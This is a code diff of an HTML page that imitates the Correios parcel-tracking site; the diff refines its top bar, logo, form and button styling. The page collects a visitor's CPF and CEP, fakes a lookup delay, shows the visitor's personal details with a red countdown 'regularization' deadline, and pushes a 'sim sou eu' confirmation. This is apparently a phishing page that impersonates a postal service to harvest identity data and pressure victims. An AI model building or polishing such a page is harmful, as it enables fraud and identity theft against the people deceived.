@@ -13,6 +13,132 @@
   <title>Correios | Rastreio</title>
 
   <style>
+    /* ====== Top Bar amarela ====== */
+    #top-bar {
+      background-color: #ffd500;
+      height: 48px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0 15px;
+      font-family: Arial, sans-serif;
+      font-size: 14px;
+      color: #003157;
+      box-sizing: border-box;
+    }
+
+    #top-bar .left-options a {
+      color: #003157;
+      text-decoration: none;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    #top-bar .left-options a:hover {
+      text-decoration: underline;
+    }
+
+    #top-bar .right-options {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+
+    #btn-entrar {
+      display: flex;
+      align-items: center;
+      background: none;
+      border: none;
+      cursor: pointer;
+      font-size: 14px;
+      color: #003157;
+      font-weight: 600;
+      padding: 0;
+    }
+
+    #btn-entrar img {
+      height: 20px;
+      margin-right: 6px;
+      vertical-align: middle;
+    }
+
+    #btn-entrar:hover {
+      text-decoration: underline;
+    }
+
+    #menu-hamburguer {
+      display: inline-block;
+      cursor: pointer;
+      width: 25px;
+      height: 18px;
+      position: relative;
+    }
+
+    #menu-hamburguer span {
+      background: #003157;
+      position: absolute;
+      height: 3px;
+      width: 100%;
+      border-radius: 2px;
+      opacity: 1;
+      left: 0;
+      transition: all 0.3s ease;
+    }
+
+    #menu-hamburguer span:nth-child(1) {
+      top: 0;
+    }
+
+    #menu-hamburguer span:nth-child(2) {
+      top: 7.5px;
+    }
+
+    #menu-hamburguer span:nth-child(3) {
+      top: 15px;
+    }
+
+    /* ====== Logo centralizada na horizontal e alinhada com botão consultar ====== */
+    header {
+      margin-top: 10px;
+      display: flex;
+      justify-content: center;
+      position: relative;
+    }
+
+    header img {
+      height: 40px; /* tamanho padrão, pode ajustar */
+      display: block;
+    }
+
+    main {
+      max-width: 1000px;
+      margin: 2rem auto;
+      padding: 0 1rem;
+    }
+
+    /* Alinhamento horizontal do botão consultar e logo na mesma direção */
+    #botao-container {
+      display: flex;
+      justify-content: flex-start;
+      margin-top: 1rem;
+    }
+
+    #consultar-btn {
+      padding: 0.5rem 1.5rem;
+      font-size: 1rem;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      animation: pulsar 1s infinite;
+    }
+
+    #consultar-btn:hover {
+      background-color: #0056b3;
+    }
+
+    /* Pulsar botão */
     @keyframes pulsar {
       0% {
         transform: scale(1);
@@ -27,33 +153,20 @@
       }
     }
 
-    #consultar-btn {
-      animation: pulsar 1s infinite;
-      width: 150px;
+    /* Formulário */
+    #tela-formulario {
+      background-color: #f0f0f0;
+      padding: 20px;
+      border-radius: 8px;
     }
 
-    .spinner {
-      width: 50px;
-      height: 50px;
-      border: 5px solid rgba(0, 0, 0, 0.1);
-      border-top-color: #007bff;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin: 20px auto;
+    /* Campo input */
+    input.form-control {
+      max-width: 300px;
+      margin-bottom: 1rem;
     }
 
-    @keyframes spin {
-      to {
-        transform: rotate(360deg);
-      }
-    }
-
-    main {
-      max-width: 1000px;
-      margin: 2rem auto;
-      padding: 0 1rem;
-    }
-
+    /* Resultado */
     #resultado {
       background: #f8f9fa;
       border-radius: 10px;
@@ -81,6 +194,7 @@
       color: #007bff;
     }
 
+    /* Rua e Bairro vazios */
     #res-rua,
     #res-bairro {
       color: transparent !important;
@@ -88,12 +202,14 @@
       pointer-events: none;
     }
 
+    /* Prazo para regularização em vermelho */
     #res-prazo {
       font-size: 14px;
       font-weight: 700;
       color: red !important;
     }
 
+    /* Botão sim sou eu */
     #btn-sim-sou-eu {
       margin-top: 1.5rem;
       padding: 0.6rem 1.5rem;
@@ -111,6 +227,7 @@
       background-color: #0056b3;
     }
 
+    /* Container para alinhar botão e link */
     #resultado .btn-container {
       display: flex;
       flex-direction: column;
@@ -119,6 +236,7 @@
       margin-top: 1.5rem;
     }
 
+    /* Link não sou eu abaixo do botão */
     #nao-sou-eu {
       color: gray;
       text-decoration: underline;
@@ -131,97 +249,37 @@
       color: #505050;
     }
 
-    /* Faixa amarela com Entrar, Acessibilidade e menu hamburguer */
-    #top-bar {
-      background-color: #ffde00;
-      color: #003157;
-      height: 40px;
-      padding: 0 1rem;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-weight: 700;
-      font-size: 14px;
-      position: relative;
-      box-shadow: 0 2px 4px rgb(0 0 0 / 0.1);
-      z-index: 1;
-    }
-
-    #top-bar .left-options {
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-    }
-
-    #top-bar .right-options {
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-    }
-
-    /* Botões da faixa */
-    #top-bar button,
-    #top-bar a {
-      background: transparent;
-      border: none;
-      color: #003157;
-      font-weight: 700;
-      font-size: 14px;
-      cursor: pointer;
-      text-decoration: none;
-      padding: 0;
-    }
-
-    #top-bar button:hover,
-    #top-bar a:hover {
-      text-decoration: underline;
-    }
-
-    /* Ícone três listras (hambúrguer) */
-    #menu-hamburguer {
-      width: 25px;
-      height: 18px;
-      cursor: pointer;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-    }
-
-    #menu-hamburguer span {
-      background-color: #003157;
-      height: 3px;
-      border-radius: 2px;
-    }
-
-    /* Logo menor, centralizada, não encosta na faixa */
-    header#logo-header {
-      position: relative;
-      width: 100%;
+    /* Spinner */
+    .spinner {
+      width: 50px;
       height: 50px;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      margin-top: 10px; /* distância da faixa amarela */
-      z-index: 10;
-      pointer-events: none;
+      border: 5px solid rgba(0, 0, 0, 0.1);
+      border-top-color: #007bff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
     }
 
-    header#logo-header img {
-      height: 50px;
-      pointer-events: auto;
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
     }
   </style>
 </head>
 
 <body>
-  <!-- Faixa amarela com opções -->
+  <!-- Faixa amarela topo -->
   <div id="top-bar">
     <div class="left-options">
       <a href="#" id="acessibilidade">Acessibilidade</a>
     </div>
 
     <div class="right-options">
-      <button id="btn-entrar" type="button">Entrar</button>
+      <button id="btn-entrar" type="button">
+        <img src="images/entrar.svg" alt="Entrar" />
+        Entrar
+      </button>
 
       <div id="menu-hamburguer" aria-label="Menu">
         <span></span>
@@ -231,65 +289,38 @@
     </div>
   </div>
 
-  <!-- Logo menor, centralizada e espaçada da faixa -->
-  <header id="logo-header">
+  <!-- Logo centralizada -->
+  <header>
     <img src="images/correios.png" alt="Logo Correios" />
   </header>
 
   <main>
-    <h1
-      class="mt-4 px-2 font-size-24 text-blue-dark font-weight-700 w-95 max-w-1000"
-      style="margin: 0 auto"
-    >
+    <h1 class="mt-4 px-2 font-size-24 text-blue-dark font-weight-700 w-95 max-w-1000" style="margin: 0 auto;">
       Rastreamento
     </h1>
 
     <!-- Tela Formulário -->
-    <section
-      id="tela-formulario"
-      class="mt-3 p-4 bg-grey-3 w-95 max-w-1000"
-      style="margin: 0 auto"
-    >
+    <section id="tela-formulario" class="mt-3 p-4 bg-grey-3 w-95 max-w-1000" style="margin: 0 auto;">
+      <h5 style="color: #003157;" class="text-center font-weight-700 mb-4">
+        <i class="far fa-exclamation-triangle"></i> ACOMPANHE SUAS ENCOMENDAS ABAIXO
+      </h5>
+
       <form id="form-rastreamento">
         <span>Digite o CPF do comprador.</span>
         <div class="form-group mt-1">
-          <input
-            type="text"
-            name="cpf"
-            class="form-control"
-            placeholder="000.000.000-00"
-            maxlength="14"
-            required
-            id="cpf"
-          />
+          <input type="text" name="cpf" class="form-control" placeholder="000.000.000-00" maxlength="14" required id="cpf" />
         </div>
 
         <span>Informe o seu CEP abaixo.</span>
         <div class="form-group mt-1">
-          <input
-            type="text"
-            name="cep"
-            class="form-control"
-            id="cep"
-            placeholder="00000-000"
-            maxlength="9"
-            required
-          />
+          <input type="text" name="cep" class="form-control" id="cep" placeholder="00000-000" maxlength="9" required />
         </div>
 
-        <div
-          class="form-group mt-1 d-flex justify-content-center"
-          id="botao-container-form"
-        >
-          <button type="submit" class="btn btn-primary" id="consultar-btn">
-            Consultar
-          </button>
+        <div class="form-group mt-1" id="botao-container">
+          <button type="submit" class="btn" id="consultar-btn">Consultar</button>
         </div>
 
-        <div
-          id="loading-container"
-          style="display: none; text-align: center; margin-top: 20px;"
-        >
+        <div id="loading-container" style="display: none; text-align: center; margin-top: 20px;">
           <p style="font-size: 16px; color: #333;">Consultando seus dados...</p>
           <div class="spinner"></div>
         </div>
@@ -403,7 +434,7 @@
           return;
         }
 
-        document.getElementById("botao-container-form").style.display = "none";
+        document.getElementById("botao-container").style.display = "none";
         document.getElementById("loading-container").style.display = "block";
 
         await new Promise((resolve) => setTimeout(resolve, 2000));
@@ -425,6 +456,7 @@
           dadosPessoa.nascimento;
         document.getElementById("res-cep").textContent = dadosPessoa.cep;
 
+        // Deixa rua e bairro vazios
         document.getElementById("res-rua").textContent = "";
         document.getElementById("res-bairro").textContent = "";
 
@@ -439,6 +471,7 @@
         intervalContagem = setInterval(atualizarContagemRegressiva, 1000);
       });
 
+    // Script para o link "não sou eu"
     document.getElementById("nao-sou-eu").addEventListener("click", function (e) {
       e.preventDefault();
       window.open("https://www.correios.com.br/", "_blank");
